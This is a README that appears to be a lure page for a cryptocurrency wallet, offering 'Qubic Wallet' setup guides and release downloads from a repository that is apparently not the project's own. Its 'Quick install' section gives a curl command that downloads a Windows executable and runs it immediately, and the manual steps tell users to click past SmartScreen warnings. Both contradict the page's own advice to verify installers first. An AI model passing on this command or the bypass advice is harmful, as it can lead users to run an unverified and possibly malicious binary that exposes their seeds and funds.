![Qubic Wallet](assets/qubic-wallet-download-seed-phrase-install-address-article-banner.png)

# Qubic Wallet setup and account guides

Install the desktop wallet, create an account and keep the seed recoverable.

<p align="center"><a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/LICENSE"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) |

> Setup is the part where a small mistake is expensive and invisible: a seed written down wrong looks
> exactly like a seed written down right until the day you need it. These guides are ordered to make that
> mistake unlikely rather than to be quick.

## What this repository is for

Fifteen guides covering the path from a download to an account you can actually recover. The order
matters more than the individual pages: verifying the installer before running it, creating the account
with a backup proof rather than a backup intention, and only then moving funds into it. Each page states
what it assumes you have already done, so you can start in the middle if you are already past the first
step.

The pages are written against the current release rather than an older build. Where a screen or a menu
label differs between versions, the guide says which version it describes and points at the release page
instead of reproducing a screenshot that will age badly. Installer names, archive formats and file sizes
come from the release itself, so the file you download can be matched to the file the guide describes.

Setup pages also cover the recovery side, because a backup you have never tested is a hypothesis. The
seed format page explains the two accepted forms, the restore page walks the recovery path, and the
vault page explains what the encrypted vault file does and does not preserve. If you only read one page
after installation, read the one that proves you can restore.

## Who it is for

- First-time users installing the desktop wallet on Windows, macOS or Linux.
- People who already run the wallet but have never tested a restore from their written seed.
- Anyone moving an existing account to a new computer or a second device.
- Users who need to reset or recover an account and want to know what is and is not possible first.

## Start here

- [Qubic Wallet download: get the installer and verify it before you run it](qubic-wallet-download-verify-installer.md) -
  where the official artefacts live, how to match the file you have to the release, and when to stop.
- [How to install Qubic Wallet on Windows, macOS and Linux](qubic-wallet-install-windows-macos-linux.md) -
  the per-platform install path, including the archive formats the desktop builds actually ship in.
- [Creating your first Qubic Wallet account: seed type, password and backup proof](qubic-wallet-create-first-account.md) -
  the creation flow and the check that turns a backup into something you have verified.
- [Restoring a Qubic Wallet account from a seed or a vault file](qubic-wallet-restore-account-seed.md) -
  the recovery path, run once on purpose so that the real recovery is not the first attempt.

## How to use these guides

1. Verify the installer before you run it; every later step assumes the binary is the one you meant.
2. Create the account and write the seed down before you fund it, not after.
3. Test the restore path while the account is still empty.
4. Configure auto-lock and the data folder once you know where the vault lives.
5. Only then move funds, and keep the first amount small until a send and a receive have both worked.

## The guides

### Getting the wallet onto the machine

- [Qubic Wallet download: get the installer and verify it before you run it](qubic-wallet-download-verify-installer.md) -
  the official release location, the asset names to expect, and the checks that catch a substituted file.
- [How to install Qubic Wallet on Windows, macOS and Linux](qubic-wallet-install-windows-macos-linux.md) -
  install steps per platform, including what to do with the .zip builds on macOS and Linux.
- [Updating Qubic Wallet and checking the version you run](qubic-wallet-update-version.md) - how to read
  the version you have, how updates arrive, and why the version number matters to later guides.
- [Qubic Wallet antivirus and SmartScreen warnings explained](qubic-wallet-antivirus-smartscreen-warning.md) -
  why a new desktop build can be flagged, and how to tell a heuristic warning from a real substitution.

### Creating and protecting the account

- [Creating your first Qubic Wallet account: seed type, password and backup proof](qubic-wallet-create-first-account.md) -
  account creation, the password's role, and the backup proof that confirms the seed is usable.
- [Qubic Wallet seed phrase format: 55 characters or 24 words](qubic-wallet-seed-phrase-format.md) - the two
  accepted seed forms, how to check a transcription, and the mistakes that survive a spellcheck.
- [How Qubic Wallet login works: one password, one account](qubic-wallet-login-password-accounts.md) - what
  the password unlocks, what it does not protect, and why it cannot recover a lost seed.
- [Qubic Wallet auto-lock: choosing a timeout that fits your risk](qubic-wallet-auto-lock-settings.md) -
  the lock behaviour, the trade-off it encodes, and how to pick a timeout you will actually keep.

### Recovery, devices and moving

- [Restoring a Qubic Wallet account from a seed or a vault file](qubic-wallet-restore-account-seed.md) -
  the two restore inputs, what each one can rebuild, and the order to try them in.
- [Forgot your Qubic Wallet password? What a vault reset can and cannot do](qubic-wallet-forgot-password-vault-reset.md) -
  what a reset restores, what it destroys, and why the seed is the only real fallback.
- [Can you recover a Qubic Wallet without the seed phrase?](qubic-wallet-recovery-without-seed-phrase.md) -
  the honest answer, the narrow exceptions, and the cases where recovery is not possible at all.
- [Same Qubic Wallet seed on two computers: what changes](qubic-wallet-two-devices-same-seed.md) - how a
  second device sees the same account, and what the shared seed means for your threat model.
- [Moving Qubic Wallet to a new computer without losing the account](qubic-wallet-move-to-new-computer.md) -
  the transfer order that keeps the old machine usable until the new one is proven.
- [Multiple Qubic Wallet accounts, sub-accounts and derived addresses](qubic-wallet-multiple-accounts.md) -
  how accounts are separated, what derivation does, and how to keep them straight.

### Where the data lives

- [Where Qubic Wallet keeps its data, config and vault files](qubic-wallet-data-folder-config-backup.md) -
  the on-disk layout per platform, and which files are worth copying and which are not.

## What each guide changes

| Task | Guide | Outcome |
| --- | --- | --- |
| Get a trustworthy installer | [Download and verify](qubic-wallet-download-verify-installer.md) | A file you have matched to the release before running it |
| Install on your platform | [Install guide](qubic-wallet-install-windows-macos-linux.md) | A working build, with the archive extracted correctly |
| Create a recoverable account | [First account](qubic-wallet-create-first-account.md) | A funded account whose seed has been proven by a restore |
| Test recovery on purpose | [Restore guide](qubic-wallet-restore-account-seed.md) | Confidence instead of an untested assumption |
| Move to a new machine | [Moving guide](qubic-wallet-move-to-new-computer.md) | The account on the new computer, old one still intact |
| Reset a forgotten password | [Vault reset](qubic-wallet-forgot-password-vault-reset.md) | A working vault, or a clear answer that the seed is required |

## Common first questions

### Does the password protect my funds?

It protects the vault on this machine. It does not derive the account and cannot restore it anywhere
else, which is why the password reset cannot recover a lost seed.

### Which seed format should I use?

Whichever the wallet offers you at creation, written down exactly as shown. The format page explains both
forms and the transcription errors that pass a casual check.

### Can I run the same account on two computers?

Yes, with the same seed, and the second device sees the same account. The two-devices page explains what
that means for anyone who obtains one of the machines.

### Is the .zip build on macOS a normal installer?

No. It is an archive you extract and run, which is why the install page gives steps rather than a single
command. Treat anything that presents a .zip as a click-to-install package with suspicion.

## Before you install

- Read the download page before you download, not after you have already run something.
- Write the seed on paper, in full, and check it against the wallet character by character.
- Know where the vault file lives on your platform before you need to find it.
- Plan the restore test now; it is cheap while the account is empty and expensive later.

## How to install Qubic Wallet

Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

### Windows

Manual install:

1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS

The macOS build ships as a .zip archive, so there is no one-line command that both downloads and launches it. Extract it first, then open the app.

1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a>.
2. Double-click the .zip to extract it.
3. Move the extracted app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux

The Linux build ships as a .zip archive as well; extract it and run the binary inside.

1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip">qubic-wallet-desktop-v0.8.2-linux-x64.zip</a>.
2. Extract the archive.
3. Make the extracted binary executable.
4. Run it.


## About and license

Qubic Wallet is the desktop wallet for Qubic: seed-based accounts, local key storage and the QX trading screen, on Windows, macOS and Linux.

These guides are published under the MIT license; the full text is in the repository `LICENSE` file. Nothing here is an audit or an endorsement, and every claim is checked against the release, the repository or the client constants rather than repeated from marketing.
